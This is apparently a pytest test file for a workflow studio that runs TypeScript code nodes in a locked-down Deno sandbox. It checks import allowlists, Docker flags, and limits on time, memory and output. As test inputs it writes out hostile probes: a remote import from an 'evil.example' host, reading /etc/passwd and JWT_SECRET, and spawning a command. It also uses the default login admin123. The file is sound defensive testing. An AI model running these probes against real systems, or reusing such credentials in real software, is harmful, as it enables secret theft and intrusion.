"""TypeScript Code nodes on Deno, with the same contract as Python.

Host tests need a `deno` binary (STUDIO_DENO or PATH) and are skipped without one. Docker tests need Docker and
`studio-code-ts:1` and are skipped without them (STUDIO_TEST_DOCKER=0 turns them off)."""
import os, shutil, subprocess, time, uuid
import pytest
from fastapi.testclient import TestClient
from app.core.errors import AppError
from app.engine import code_languages as L, code_runtime as cr
from app.engine.runtime import run_stream
from app.engine.sandbox import container
from app.engine.validator import validate
from app.main import app

c = TestClient(app)
H = lambda t: {"Authorization": f"Bearer {t}"}
DENO = os.environ.get("STUDIO_DENO") or shutil.which("deno")
needs_deno = pytest.mark.skipif(not DENO, reason="deno is not installed")
TS = 'export function main(state: { message: string }) {\n  console.log("got", state.message)\n  return state.message.toUpperCase()\n}\n'
PY = 'def main(state):\n    print("got", state["message"])\n    return state["message"].upper()\n'
SAME = {  # one behaviour, written in both languages
    "python": {"ok": PY, "boom": 'def main(s):\n    raise ValueError("boom")\n', "none": "def main(s):\n    return {1, 2}\n",
               "loop": "def main(s):\n    while True: pass\n"},
    "typescript": {"ok": TS, "boom": 'export function main(s) {\n  throw new Error("boom")\n}\n', "none": "export function main(s) { return 10n }\n",
                   "loop": "export function main(s) { while (true) {} }\n"},
}


def wf(code, language="typescript"):
    return {"name": f"ts-{uuid.uuid4().hex[:6]}", "state": [{"name": "message", "type": "string"}, {"name": "out", "type": "string"}],
            "edges": [{"id": "1", "source": "s", "target": "c"}, {"id": "2", "source": "c", "target": "e"}],
            "nodes": [{"id": "s", "type": "start", "position": {"x": 0, "y": 0}, "data": {"label": "s"}},
                      {"id": "c", "type": "tool", "position": {"x": 1, "y": 0}, "data": {"label": "c", "mode": "code", "language": language, "code": code, "output_field": "out"}},
                      {"id": "e", "type": "end", "position": {"x": 2, "y": 0}, "data": {"label": "e"}}]}


@pytest.fixture
def host(monkeypatch):
    monkeypatch.setenv("STUDIO_ENABLE_CODE_NODES", "1"); monkeypatch.setenv("STUDIO_CODE_RUNTIME", "subprocess")
    monkeypatch.delenv("STUDIO_CODE_LANGUAGES", raising=False); monkeypatch.delenv("STUDIO_CODE_TS_PACKAGES", raising=False)
    monkeypatch.delenv("STUDIO_CODE_TS_DENO_DIR", raising=False)
    if DENO: monkeypatch.setenv("STUDIO_DENO", DENO)


def run_ts(code, state=None, **kw): return cr.run_code(code, state or {}, node="c", language="typescript", **kw)


def fails(code, state=None, **kw):
    with pytest.raises(AppError) as e: run_ts(code, state, **kw)
    return e.value


# ---- reading the source (never executed on the server) ----

def test_static_checks(host):
    p = lambda s: cr.problems(s, "typescript")
    assert p(TS) == [] and p("export const main = (s) => 1") == [] and p("async function main() {}\nexport { main }") == []
    assert p("export async function main(s) { return 1 }") == []
    assert p("function main(s) { return 1 }")[0].startswith("export a function main(state)")
    assert p("// export function main(s) {}\nconst x = 1")[0].startswith("export a function main")  # comments do not count
    assert p('import fs from "node:fs"\nexport const main = () => 1') == ['import "node:fs" is not available (no packages are allowed here)']
    assert p('export const main = async () => (await import("https://evil.example/x.ts")).x')[0].startswith('import "https://evil.example/x.ts"')
    assert p("")[0] == "the code is empty"


def test_allowlist_from_settings(host, monkeypatch):
    monkeypatch.setenv("STUDIO_CODE_TS_PACKAGES", "npm:zod@3, jsr:@std/path@1")
    ok = ('import { z } from "npm:zod@3"\nimport { y } from "npm:zod@3.25.1"\nimport { join } from "jsr:@std/path@1/join"\n'
          'export const main = () => 1')
    assert cr.problems(ok, "typescript") == []
    p = lambda imp: cr.problems(f'import x from "{imp}"\nexport const main = () => 1', "typescript")
    assert "allowed: npm:zod@3, jsr:@std/path@1" in p("npm:zodiac@3")[0]
    assert p("npm:zod") == ['import "npm:zod" needs a version: use "npm:zod@3"']  # Deno would pick the newest
    assert p("npm:zod@4") == ['import "npm:zod@4": version 4 is not available, use "npm:zod@3"']
    assert p("npm:zod@30") == ['import "npm:zod@30": version 30 is not available, use "npm:zod@3"']
    assert p("jsr:@std/path/join") == ['import "jsr:@std/path/join" needs a version: use "jsr:@std/path@1"']
    assert p("npm:zod@^3")[0].endswith('use "npm:zod@3"')


def test_import_check_on_save(host, monkeypatch):
    monkeypatch.setenv("STUDIO_CODE_TS_PACKAGES", "npm:zod@3")
    errs = validate(wf('import { z } from "npm:zod"\nexport const main = () => 1'))
    assert 'Node c: import "npm:zod" needs a version: use "npm:zod@3"' in errs
    assert not [e for e in validate(wf('import { z } from "npm:zod@3"\nexport const main = () => 1')) if "import" in e]
    assert L.import_problem("npm:zod", ["npm:zod@3"]) == 'import "npm:zod" needs a version: use "npm:zod@3"'
    assert L.import_problem("npm:zod@3/mini", ["npm:zod@3"]) is None
    assert L.import_problem("npm:zod@3", ["npm:zod"]) == 'import "npm:zod@3": use "npm:zod" (no version)'


def test_default_packages_follow_the_runtime(monkeypatch):
    monkeypatch.delenv("STUDIO_CODE_TS_PACKAGES", raising=False); monkeypatch.delenv("STUDIO_CODE_TS_DENO_DIR", raising=False)
    monkeypatch.setenv("STUDIO_ENABLE_CODE_NODES", "1"); monkeypatch.setenv("STUDIO_CODE_RUNTIME", "docker")
    assert L.LANGUAGES["typescript"].packages() == ["npm:zod@3", "npm:date-fns@4"]  # pinned, cached in studio-code-ts:1
    monkeypatch.setenv("STUDIO_CODE_RUNTIME", "subprocess")
    assert L.LANGUAGES["typescript"].packages() == []  # the host has no cache unless STUDIO_CODE_TS_DENO_DIR is set


def test_docker_command_is_locked_and_has_no_permission_flag(monkeypatch):
    monkeypatch.setattr(container, "docker_exe", lambda: "docker")
    lang = L.LANGUAGES["typescript"]
    argv = container.build_code(name="n", image=lang.image(), command=lang.command(), memory="256m", cpus="0.5", pids=64,
                                environment=lang.container_env())
    s = " ".join(argv)
    for flag in ("--network none", "--read-only", "--cap-drop ALL", "--memory 256m", "--pids-limit 64", "studio-code-ts:1",
                 "deno run", "--no-prompt", "--no-remote", "--cached-only", "--max-old-space-size=192"):
        assert flag in s, flag
    assert not any(a.startswith(("--allow", "-A")) for a in argv) and "PYTHON" not in s


def test_missing_deno_is_reported_not_a_fallback(host, monkeypatch):
    monkeypatch.setenv("STUDIO_DENO", "/nonexistent/deno")
    assert cr.unavailable("typescript") == "Deno is not installed (install deno or set STUDIO_DENO)"
    assert cr.unavailable("python") is None  # one language can be offline while the other runs
    assert fails(TS).code == "CODE_RUNTIME_UNAVAILABLE"
    assert any("typescript Code nodes cannot run on this server: Deno is not installed" in e for e in validate(wf(TS)))


def test_typescript_can_be_turned_off(host, monkeypatch):
    monkeypatch.setenv("STUDIO_CODE_LANGUAGES", "python")
    assert fails(TS).code == "CODE_LANGUAGE_UNSUPPORTED"


# ---- the same contract in both languages (host runtime) ----

@needs_deno
@pytest.mark.parametrize("language", ["python", "typescript"])
def test_same_contract(host, language, monkeypatch):
    src = SAME[language]
    r = cr.run_code(src["ok"], {"message": "hi"}, language=language)
    assert r.value == "HI" and r.stdout == "got hi\n" and r.runtime == "subprocess"
    with pytest.raises(AppError) as e: cr.run_code(src["boom"], {}, node="c", language=language)
    assert e.value.code == "CODE_FAILED" and "boom" in e.value.output["traceback"] and "<code>" in e.value.output["traceback"]
    with pytest.raises(AppError) as e: cr.run_code(src["none"], {}, node="c", language=language)
    assert e.value.code == "CODE_RESULT_NOT_JSON"
    monkeypatch.setenv("STUDIO_CODE_MAX_SECONDS", "1"); t = time.monotonic()
    with pytest.raises(AppError) as e: cr.run_code(src["loop"], {}, node="c", language=language)
    assert e.value.code == "CODE_TIMEOUT" and time.monotonic() - t < 6


# ---- TypeScript on the host runtime ----

@needs_deno
def test_runs_typescript_with_async_main_and_objects(host):
    r = run_ts('type In = { n: number }\nexport async function main(s: In) {\n  await new Promise((r) => setTimeout(r, 10))\n'
               '  console.log({ n: s.n })\n  return { double: s.n * 2, list: [1, "a", null] }\n}', {"n": 21})
    assert r.value == {"double": 42, "list": [1, "a", None]} and r.stdout == "{ n: 21 }\n"


@needs_deno
@pytest.mark.parametrize("code, needle", [
    ('export function main() { return Deno.readTextFileSync("/etc/passwd") }', "Requires read access"),
    ('export function main() { Deno.writeTextFileSync("/tmp/lgs-never", "x"); return 1 }', "Requires write access"),
    ('export async function main() { return (await fetch("http://127.0.0.1:8080")).status }', "Requires net access"),
    ('export function main() { return Deno.env.get("JWT_SECRET") }', "Requires env access"),
    ('export function main() { return new Deno.Command("id").outputSync().code }', "Requires run access"),
    ('export function main() { return Deno.hostname() }', "Requires sys access"),
])
def test_deno_has_no_permission_at_all(host, code, needle):
    e = fails(code)
    assert e.code == "CODE_FAILED" and needle in e.to_dict()["message"] + e.output["traceback"]
    assert not os.path.exists("/tmp/lgs-never")


@needs_deno
def test_invalid_code_and_exit(host):
    e = fails("export function main(s) { return ( }")
    assert e.code == "CODE_INVALID" and "SyntaxError" in e.to_dict()["message"]
    assert fails("export const main = 1").code == "CODE_INVALID"  # exported, but not a function
    e = fails("export function main() { Deno.exit(0) }")
    assert e.code == "CODE_FAILED" and "Deno.exit" in e.to_dict()["message"]


@needs_deno
def test_memory_limit(host, monkeypatch):
    monkeypatch.setenv("STUDIO_CODE_MEMORY", "64m")
    e = fails("export function main() { const a: number[][] = []; while (true) a.push(new Array(1e6).fill(1)) }")
    assert e.code == "CODE_MEMORY"


@needs_deno
def test_stdout_is_clipped(host):
    r = run_ts('export function main() { for (let i = 0; i < 20000; i++) console.log("0123456789"); return 1 }')
    assert r.value == 1 and len(r.stdout.encode()) < cr.STDOUT_MAX + 100 and "more bytes]" in r.stdout


@needs_deno
def test_allowlisted_npm_package_from_a_cache(host, monkeypatch, tmp_path_factory):
    cache = tmp_path_factory.mktemp("deno-cache")
    deps = cache / "deps.ts"; deps.write_text('import "npm:zod@3";\n')
    p = subprocess.run([DENO, "cache", "--no-config", "--no-lock", str(deps)], env={**os.environ, "DENO_DIR": str(cache)},
                       capture_output=True, text=True, timeout=120)
    if p.returncode != 0: pytest.skip(f"cannot fill a Deno cache here (no network?): {p.stderr[-200:]}")
    monkeypatch.setenv("STUDIO_CODE_TS_DENO_DIR", str(cache)); monkeypatch.setenv("STUDIO_CODE_TS_PACKAGES", "npm:zod@3")
    assert run_ts('import { z } from "npm:zod@3"\nexport function main(s) { return z.string().min(2).parse(s.m) }', {"m": "ok"}).value == "ok"
    monkeypatch.setenv("STUDIO_CODE_TS_PACKAGES", "npm:zod@3,npm:left-pad@1")  # allowed but not cached: still cannot load
    assert fails('import pad from "npm:left-pad@1"\nexport const main = () => pad("1", 3)').code == "CODE_INVALID"


@needs_deno
def test_engine_and_api(host):
    done = next(e for e in run_stream(wf(TS), {"message": "x"}) if e["type"] == "node_finished" and e["node"] == "c")
    assert done["code_output"]["runtime"] == "subprocess"
    tok = c.post("/api/auth/login", json={"email": "admin@example.com", "password": "admin123"}).json()["data"]["token"]
    langs = {x["id"]: x for x in c.get("/api/meta/runtime", headers=H(tok)).json()["data"]["languages"]}
    assert langs["typescript"]["available"] is True and "export function main(state: State)" in langs["typescript"]["starter"]
    d = c.post("/api/code/test", json={"source": TS, "state": {"message": "abc"}, "language": "typescript"}, headers=H(tok)).json()["data"]
    assert d["ok"] is True and d["value"] == "ABC" and d["stdout"] == "got abc\n"
    d = c.post("/api/code/test", json={"source": SAME["typescript"]["boom"], "state": {}, "language": "typescript"}, headers=H(tok)).json()["data"]
    assert d["ok"] is False and d["error"]["code"] == "CODE_FAILED"
    wid = c.post("/api/workflows", json=wf(TS), headers=H(tok)).json()["data"]["id"]
    with c.websocket_connect(f"/ws/run?token={tok}") as ws:
        ws.send_json({"workflow_id": wid, "input": {"message": "hi"}})
        while (ev := ws.receive_json())["type"] not in ("run_finished", "error"): pass
    assert ev["type"] == "run_finished" and ev["state"]["out"] == "HI"


# ---- Docker runtime (needs Docker and studio-code-ts:1) ----

@pytest.fixture
def ts_sandbox(monkeypatch):
    if os.environ.get("STUDIO_TEST_DOCKER") == "0": pytest.skip("Docker tests turned off")
    monkeypatch.setenv("STUDIO_ENABLE_CODE_NODES", "1"); monkeypatch.delenv("STUDIO_CODE_RUNTIME", raising=False)
    cr._checked.clear()
    if (why := cr.unavailable("typescript")): pytest.skip(f"TypeScript sandbox unavailable: {why}")


def test_docker_runs_typescript_and_its_packages(ts_sandbox):
    r = run_ts('import { z } from "npm:zod@3"\nimport { addDays } from "npm:date-fns@4"\n'
               'export function main(s: { message: string }) { return [z.string().parse(s.message), addDays(new Date(0), 1).toISOString()] }',
               {"message": "hi"})
    assert r.value == ["hi", "1970-01-02T00:00:00.000Z"] and r.runtime == "docker"


def test_docker_typescript_has_no_network(ts_sandbox):
    assert fails('export async function main() { return (await fetch("http://1.1.1.1")).status }').code == "CODE_FAILED"
